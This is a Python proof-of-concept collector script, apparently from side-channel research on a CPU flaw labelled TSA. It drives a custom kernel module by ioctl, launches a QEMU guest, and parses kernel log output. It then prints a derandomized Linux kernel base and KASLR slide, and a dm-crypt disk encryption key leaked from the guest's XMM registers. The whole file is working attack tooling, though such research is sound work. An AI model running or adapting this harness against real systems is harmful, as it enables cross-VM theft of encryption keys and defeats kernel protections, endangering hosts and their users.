#!/usr/bin/env python3
"""
tsa_poc_collect.py

Minimal PoC collector for tsa_bench_ioctl.c.

Supports two bench modes:

  --bench-mode vmrun
      Uses TSA_BENCH_7_VMRUN.
      Starts QEMU first, waits for QEMU_READY_MARKER, then issues ioctl.

  --bench-mode singlestep
      Uses TSA_BENCH_8_SINGLSTEP.
      Issues ioctl first in a worker thread, then starts QEMU.
      Does NOT wait for QEMU_READY_MARKER.

Example:
  sudo python3 run_poc.py break_kaslr --bench-mode vmrun --event-range 0x76:0x76

  sudo python3 run_poc.py break_dm_crypt --bench-mode singlestep --event-range 0x76:0x76 --default-samples 50
"""

from __future__ import annotations

import argparse
import ctypes
import fcntl
import os
import queue
import re
import selectors
import signal
import subprocess
import sys
import threading
import time
from collections import Counter
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple


TSA_BENCH_MAX_LIST = 32

TSA_BENCH_7_VMRUN      = 1 << 6
TSA_BENCH_8_SINGLSTEP = 1 << 7

TSA_ACCESS_VIRTUAL  = 1
TSA_ACCESS_PHYSICAL = 2
TSA_ACCESS_VMRUN    = 3

TSA_BREAK_KASLR    = 4
TSA_BREAK_DM_CRYPT = 5

TSA_IOCTL_MAGIC          = ord("T")
TSA_IOCTL_NR_START_BENCH = 0x42

_IOC_NRBITS    = 8
_IOC_TYPEBITS  = 8
_IOC_SIZEBITS  = 14
_IOC_NRSHIFT   = 0
_IOC_TYPESHIFT = _IOC_NRSHIFT + _IOC_NRBITS
_IOC_SIZESHIFT = _IOC_TYPESHIFT + _IOC_TYPEBITS
_IOC_DIRSHIFT  = _IOC_SIZESHIFT + _IOC_SIZEBITS
_IOC_WRITE     = 1


def _ioc(direction: int, type_: int, nr: int, size: int) -> int:
    return (
        (direction << _IOC_DIRSHIFT)
        | (type_ << _IOC_TYPESHIFT)
        | (nr << _IOC_NRSHIFT)
        | (size << _IOC_SIZESHIFT)
    )


class TsaBenchArgs(ctypes.Structure):
    _fields_ = [
        ("run_id", ctypes.c_uint64),
        ("bench_mask", ctypes.c_uint32),
        ("repeats", ctypes.c_uint32),
        ("n_samples", ctypes.c_uint32),
        ("samples", ctypes.c_uint32 * TSA_BENCH_MAX_LIST),
        ("n_secret_bits", ctypes.c_uint32),
        ("secret_bits", ctypes.c_uint32 * TSA_BENCH_MAX_LIST),
        ("event_start", ctypes.c_uint32),
        ("event_end", ctypes.c_uint32),
        ("umask_start", ctypes.c_uint32),
        ("umask_end", ctypes.c_uint32),
        ("accuracy_threshold_permille", ctypes.c_uint32),
        ("mitigation_mask", ctypes.c_uint32),
        ("access_mask", ctypes.c_uint32),
        ("negative_mask", ctypes.c_uint32),
        ("default_samples", ctypes.c_uint32),
        ("default_secret_bits", ctypes.c_uint32),
        ("default_event", ctypes.c_uint32),
    ]


TSA_IOCTL_START_BENCH = _ioc(
    _IOC_WRITE,
    TSA_IOCTL_MAGIC,
    TSA_IOCTL_NR_START_BENCH,
    ctypes.sizeof(TsaBenchArgs),
)


DEFAULT_SAMPLES     = [1, 2, 4, 8, 16, 32, 50, 64, 100, 128, 256, 512]
DEFAULT_SECRET_BITS = [32, 64, 128, 256, 512]

DEFAULT_QEMU_CMD_KASLR = ["sudo", "taskset", "-c", "0", "./vmrun/vm.sh"]
DEFAULT_QEMU_CMD_DM_CRYPT = ["sudo", "taskset", "-c", "0", "./vmrun/vm.sh", "dm_crypt"]

QEMU_READY_MARKER = "[*] Writing RAX"


BENCH_MODES: Dict[str, int] = {
    "vmrun": TSA_BENCH_7_VMRUN,
    "singlestep": TSA_BENCH_8_SINGLSTEP,
}


# ------------------------------------------------------------------ #
# PoC registry                                                        #
# ------------------------------------------------------------------ #

class PocSpec:
    def __init__(
        self,
        name: str,
        access_type: int,
        bench_name: str,
        result_handler: Callable[[List[Dict[str, object]]], None],
        expected_end_count: int = 1,
    ):
        self.name = name
        self.access_type = access_type
        self.bench_name = bench_name
        self.result_handler = result_handler
        self.expected_end_count = expected_end_count


def fmt_u64(value: int) -> str:
    return f"0x{value:016x}"


def is_noise_u64(value: object) -> bool:
    if not isinstance(value, int):
        return True

    top_byte = (value >> 56) & 0xFF
    return top_byte in (0x00, 0xFF)


def summarize_break_kaslr(records: List[Dict[str, object]]) -> None:
    valid = [
        r for r in records
        if r.get("bench") == "break_kaslr"
        and not is_noise_u64(r.get("RIP"))
        and not is_noise_u64(r.get("LSTAR"))
    ]

    if not valid:
        print("No break_kaslr result records collected.")
        return

    rip_counter = Counter(int(r["RIP"]) for r in valid if not is_noise_u64(r.get("RIP")))
    lstar_counter = Counter(int(r["LSTAR"]) for r in valid if not is_noise_u64(r.get("LSTAR")))

    best_rip, _ = rip_counter.most_common(1)[0]
    best_lstar, _ = lstar_counter.most_common(1)[0]

    ENTRY_SYSCALL_64_OFFSET = 0x40
    DEFAULT_LINUX_TEXT_BASE = 0xffffffff81000000

    derandomized_base = best_lstar - ENTRY_SYSCALL_64_OFFSET
    kaslr_slide = derandomized_base - DEFAULT_LINUX_TEXT_BASE

    print(f"RIP                         = {fmt_u64(best_rip)}")
    print(f"LSTAR                       = {fmt_u64(best_lstar)}")
    print(f"Derandomized Linux Base     = {fmt_u64(derandomized_base)}")
    print(f"KASLR Slide                 = {fmt_u64(kaslr_slide)}")


def u64_le_hex(v: int) -> str:
    return int(v).to_bytes(8, "little").hex()


def summarize_leak_dm_crypt_key(records: List[Dict[str, object]]) -> None:
    valid = [r for r in records if r.get("bench") == "break_dm_crypt"]

    if not valid:
        print("No break_dm_crypt result records collected.")
        return

    round0_fields = [
        "XMM0_0_0",
        "XMM0_1_0",
        "XMM1_0_0",
        "XMM1_1_0",
    ]

    round1_fields = [
        "XMM0_0_1",
        "XMM0_1_1",
        "XMM1_0_1",
        "XMM1_1_1",
    ]

    round0_counter: Counter[Tuple[int, int, int, int]] = Counter()
    round1_counter: Counter[Tuple[int, int, int, int]] = Counter()

    for r in valid:
        r0_vals = [r.get(k) for k in round0_fields]
        r1_vals = [r.get(k) for k in round1_fields]

        if all(not is_noise_u64(v) for v in r0_vals):
            round0_counter[tuple(int(v) for v in r0_vals)] += 1

        if all(not is_noise_u64(v) for v in r1_vals):
            round1_counter[tuple(int(v) for v in r1_vals)] += 1

    if not round0_counter:
        print("No break_dm_crypt round 0 XMM result fields collected.")
        return

    if not round1_counter:
        print("No break_dm_crypt round 1 XMM result fields collected.")
        return

    round0_values, round0_count = round0_counter.most_common(1)[0]
    round1_values, round1_count = round1_counter.most_common(1)[0]

    round0_hex = "".join(u64_le_hex(v) for v in round0_values)
    round1_hex = "".join(u64_le_hex(v) for v in round1_values)

    key_hex = round0_hex + round1_hex

    print(f'Leaked DM-Crypt KEY="{key_hex}"')


POCS: Dict[str, PocSpec] = {
    "break_kaslr": PocSpec(
        name="break_kaslr",
        access_type=TSA_BREAK_KASLR,
        bench_name="break_kaslr",
        result_handler=summarize_break_kaslr,
        expected_end_count=1,
    ),

    "break_dm_crypt": PocSpec(
        name="break_dm_crypt",
        access_type=TSA_BREAK_DM_CRYPT,
        bench_name="break_dm_crypt",
        result_handler=summarize_leak_dm_crypt_key,
        expected_end_count=2,
    ),
}


# ------------------------------------------------------------------ #
# Helpers                                                             #
# ------------------------------------------------------------------ #

def parse_int(value: str) -> int:
    return int(value, 0)


def parse_int_list(value: str) -> List[int]:
    return [parse_int(x.strip()) for x in value.split(",") if x.strip()]


def parse_range(value: str) -> Tuple[int, int]:
    if ":" not in value:
        v = parse_int(value)
        return v, v

    a, b = value.split(":", 1)
    return parse_int(a), parse_int(b)


def fill_u32_array(dst, values: List[int]) -> int:
    n = min(len(values), TSA_BENCH_MAX_LIST)

    for i in range(n):
        dst[i] = int(values[i]) & 0xFFFFFFFF

    return n


def make_args(ns: argparse.Namespace, poc: PocSpec) -> TsaBenchArgs:
    run_id = ns.run_id or int(time.time_ns())
    event_start, event_end = parse_range(ns.event_range)
    umask_start, umask_end = parse_range(ns.umask_range)

    args = TsaBenchArgs()

    args.run_id = run_id
    args.bench_mask = BENCH_MODES[ns.bench_mode]
    args.repeats = ns.repeats

    samples = parse_int_list(ns.samples) if ns.samples else DEFAULT_SAMPLES
    secret_bits = parse_int_list(ns.secret_bits) if ns.secret_bits else DEFAULT_SECRET_BITS

    args.n_samples = fill_u32_array(args.samples, samples)
    args.n_secret_bits = fill_u32_array(args.secret_bits, secret_bits)

    args.event_start = event_start
    args.event_end = event_end
    args.umask_start = umask_start
    args.umask_end = umask_end

    args.accuracy_threshold_permille = ns.accuracy_threshold_permille

    args.mitigation_mask = 0
    args.access_mask = poc.access_type
    args.negative_mask = 0

    args.default_samples = ns.default_samples
    args.default_secret_bits = 0
    args.default_event = parse_int(ns.default_event)

    return args


def parse_bmk_payload(line: str) -> Optional[Dict[str, object]]:
    idx = line.find("BMK,")
    if idx < 0:
        return None

    payload = line[idx:].strip()
    parts = payload.split(",")

    if len(parts) < 2:
        return None

    record: Dict[str, object] = {
        "kind": parts[1].strip(),
    }

    for part in parts[2:]:
        if "=" not in part:
            continue

        key, value = part.split("=", 1)
        key = key.strip()
        value = value.strip()

        if not key:
            continue

        if re.fullmatch(r"-?0x[0-9a-fA-F]+", value):
            record[key] = int(value, 16)
        elif re.fullmatch(r"-?\d+", value):
            record[key] = int(value, 10)
        else:
            record[key] = value

    return record


def drain_stream(stream, out_queue: Optional["queue.Queue[str]"] = None) -> None:
    try:
        for line in stream:
            if out_queue is not None:
                out_queue.put(line)
    finally:
        try:
            stream.close()
        except Exception:
            pass


def wait_for_qemu_ready(
    proc: subprocess.Popen[str],
    output_queue: "queue.Queue[str]",
    timeout_s: float,
) -> None:
    deadline = time.time() + timeout_s if timeout_s > 0 else None

    while True:
        if proc.poll() is not None:
            raise RuntimeError(
                f"QEMU process exited before ready marker: rc={proc.returncode}"
            )

        if deadline is not None:
            remaining = deadline - time.time()
            if remaining <= 0:
                raise TimeoutError(
                    f"timed out waiting for QEMU ready marker: {QEMU_READY_MARKER!r}"
                )
            wait_s = min(0.25, remaining)
        else:
            wait_s = 0.25

        try:
            line = output_queue.get(timeout=wait_s)
        except queue.Empty:
            continue

        if QEMU_READY_MARKER in line:
            return


def start_qemu_helper(
    ns: argparse.Namespace,
    wait_ready: bool,
) -> subprocess.Popen[str]:
    proc = subprocess.Popen(
        ns.qemu_cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        start_new_session=True,
    )

    if not proc.stdout:
        kill_process_tree(proc)
        raise RuntimeError("failed to open QEMU stdout")

    output_queue: "queue.Queue[str]" = queue.Queue()

    threading.Thread(
        target=drain_stream,
        args=(proc.stdout, output_queue),
        daemon=True,
    ).start()

    if wait_ready:
        wait_for_qemu_ready(proc, output_queue, ns.qemu_ready_timeout)

    return proc


def kill_process_tree(proc: Optional[subprocess.Popen[str]]) -> None:
    if proc is None or proc.poll() is not None:
        return

    try:
        os.killpg(proc.pid, signal.SIGTERM)
    except ProcessLookupError:
        return

    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        try:
            os.killpg(proc.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass
        proc.wait(timeout=3)


def send_ioctl(device: str, args: TsaBenchArgs) -> None:
    fd = os.open(device, os.O_RDWR)
    try:
        fcntl.ioctl(fd, TSA_IOCTL_START_BENCH, args)
    finally:
        os.close(fd)


def start_ioctl_worker(
    device: str,
    args: TsaBenchArgs,
) -> Tuple[threading.Thread, List[BaseException]]:
    errors: List[BaseException] = []

    def worker() -> None:
        try:
            send_ioctl(device, args)
        except BaseException as exc:
            errors.append(exc)

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()

    return thread, errors


def raise_ioctl_error_if_any(errors: List[BaseException]) -> None:
    if errors:
        raise RuntimeError(f"ioctl worker failed: {errors[0]}") from errors[0]


def choose_default_qemu_cmd(poc_name: str) -> List[str]:
    if poc_name == "break_dm_crypt":
        return DEFAULT_QEMU_CMD_DM_CRYPT.copy()

    return DEFAULT_QEMU_CMD_KASLR.copy()


# ------------------------------------------------------------------ #
# Collector                                                           #
# ------------------------------------------------------------------ #

def collect(ns: argparse.Namespace) -> int:
    poc = POCS[ns.poc]

    args = make_args(ns, poc)
    run_id = int(args.run_id)

    qemu_proc: Optional[subprocess.Popen[str]] = None
    ioctl_thread: Optional[threading.Thread] = None
    ioctl_errors: List[BaseException] = []

    dmesg_proc = subprocess.Popen(
        ["dmesg", "--follow", "--human", "--decode"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )

    if not dmesg_proc.stdout:
        raise RuntimeError("failed to open dmesg stdout")

    if ns.bench_mode == "vmrun":
        print("starting VMRUN/QEMU helper", flush=True)

        qemu_proc = start_qemu_helper(ns, wait_ready=True)

        print("VMRUN/QEMU helper is ready", flush=True)
        print("starting ioctl after QEMU ready marker", flush=True)

        send_ioctl(ns.device, args)

    elif ns.bench_mode == "singlestep":
        print("starting SINGLSTEP ioctl before QEMU helper", flush=True)

        ioctl_thread, ioctl_errors = start_ioctl_worker(ns.device, args)

        if ns.ioctl_pre_qemu_delay > 0:
            time.sleep(ns.ioctl_pre_qemu_delay)

        raise_ioctl_error_if_any(ioctl_errors)

        print("starting QEMU helper without waiting for ready marker", flush=True)

        qemu_proc = start_qemu_helper(ns, wait_ready=False)

    else:
        raise RuntimeError(f"unknown bench mode: {ns.bench_mode}")

    print(
        f"started poc={poc.name} run_id={run_id} "
        f"bench_mode={ns.bench_mode} bench_mask=0x{int(args.bench_mask):x} "
        f"access_type={poc.access_type} "
        f"qemu_cmd={' '.join(ns.qemu_cmd)} "
        f"expected_end_count={poc.expected_end_count}",
        flush=True,
    )

    selector = selectors.DefaultSelector()
    selector.register(dmesg_proc.stdout, selectors.EVENT_READ)

    records: List[Dict[str, object]] = []
    got_end = False
    end_count = 0
    bench_end_count = 0
    last_activity = time.time()
    timeout_s = ns.timeout

    try:
        while not got_end:
            raise_ioctl_error_if_any(ioctl_errors)

            events = selector.select(timeout=1.0)
            now = time.time()

            if not events:
                if timeout_s > 0 and now - last_activity > timeout_s:
                    print(
                        f"timeout: no BMK output for {timeout_s:.0f}s; stopping",
                        file=sys.stderr,
                    )
                    break
                continue

            for key, _ in events:
                while True:
                    line = key.fileobj.readline()
                    if not line:
                        break

                    record = parse_bmk_payload(line)
                    if record is None:
                        continue

                    record_run = record.get("run")
                    if record_run is not None and record_run != run_id:
                        continue

                    last_activity = now
                    kind = record.get("kind")

                    if kind == "RESULT":
                        records.append(record)

                        if ns.verbose:
                            print(record, flush=True)

                    elif kind == "BENCH_END" and record_run == run_id:
                        bench_end_count += 1

                        print(
                            f"bench complete: "
                            f"{bench_end_count}/{poc.expected_end_count} "
                            f"bench={record.get('bench', '?')} "
                            f"bench_name={record.get('bench_name', 'unknown')}",
                            flush=True,
                        )

                    elif kind == "END" and record_run == run_id:
                        end_count += 1

                        print(
                            f"run end: {end_count}/{poc.expected_end_count} "
                            f"run_id={run_id}",
                            flush=True,
                        )

                        if end_count >= poc.expected_end_count:
                            print(
                                f"run complete run_id={run_id}; stopping collector",
                                flush=True,
                            )
                            got_end = True
                            break

    finally:
        selector.close()

        dmesg_proc.terminate()
        try:
            dmesg_proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            dmesg_proc.kill()

        kill_process_tree(qemu_proc)

        if ioctl_thread is not None and ioctl_thread.is_alive():
            ioctl_thread.join(timeout=2)

    raise_ioctl_error_if_any(ioctl_errors)

    poc.result_handler(records)

    print()
    print(f"done poc={poc.name} run_id={run_id}", flush=True)

    return 0


# ------------------------------------------------------------------ #
# CLI                                                                 #
# ------------------------------------------------------------------ #

def build_arg_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Collect TSA PoC data from /dev/tsa_bench"
    )

    p.add_argument(
        "poc",
        choices=sorted(POCS.keys()),
        help="PoC to run",
    )

    p.add_argument(
        "--bench-mode",
        choices=sorted(BENCH_MODES.keys()),
        default="vmrun",
        help=(
            "bench mode to run: "
            "vmrun uses TSA_BENCH_7_VMRUN; "
            "singlestep uses TSA_BENCH_8_SINGLSTEP and starts ioctl before QEMU"
        ),
    )

    p.add_argument("--device", default="/dev/tsa_bench")
    p.add_argument("--run-id", type=lambda x: int(x, 0), default=0)
    p.add_argument("--repeats", type=int, default=1)

    p.add_argument(
        "--samples",
        default="",
        help="comma-separated sample counts",
    )

    p.add_argument(
        "--secret-bits",
        default="",
        help="comma-separated secret lengths in bits",
    )

    p.add_argument(
        "--default-samples",
        type=int,
        default=100,
    )

    p.add_argument(
        "--default-event",
        default="0x00",
    )

    p.add_argument(
        "--event-range",
        default="0x00:0xfff",
    )

    p.add_argument(
        "--umask-range",
        default="0x00:0xff",
    )

    p.add_argument(
        "--accuracy-threshold-permille",
        type=int,
        default=875,
    )

    p.add_argument(
        "--timeout",
        type=float,
        default=60.0,
        help="seconds of silence before giving up; 0 disables",
    )

    p.add_argument(
        "--qemu-cmd",
        nargs="+",
        default=None,
        help=(
            "command used for the QEMU helper. "
            "Default: for break_kaslr uses 'sudo taskset -c 0 ./vmrun/vm.sh'; "
            "for break_dm_crypt uses 'sudo taskset -c 0 ./vmrun/vm.sh dm_crypt'"
        ),
    )

    p.add_argument(
        "--qemu-ready-timeout",
        type=float,
        default=60.0,
        help="seconds to wait for the QEMU ready marker; only used with --bench-mode vmrun",
    )

    p.add_argument(
        "--ioctl-pre-qemu-delay",
        type=float,
        default=0.25,
        help=(
            "seconds to wait after starting the singlestep ioctl worker "
            "before launching QEMU"
        ),
    )

    p.add_argument(
        "--verbose",
        action="store_true",
        help="print parsed BMK,RESULT records",
    )

    return p


def main(argv: Optional[List[str]] = None) -> int:
    parser = build_arg_parser()
    ns = parser.parse_args(argv)

    if ns.qemu_cmd is None:
        ns.qemu_cmd = choose_default_qemu_cmd(ns.poc)

    if os.geteuid() != 0:
        print("this collector must run as root", file=sys.stderr)
        return 1

    if not Path(ns.device).exists():
        print(f"device not found: {ns.device}", file=sys.stderr)
        return 1

    return collect(ns)


if __name__ == "__main__":
    raise SystemExit(main())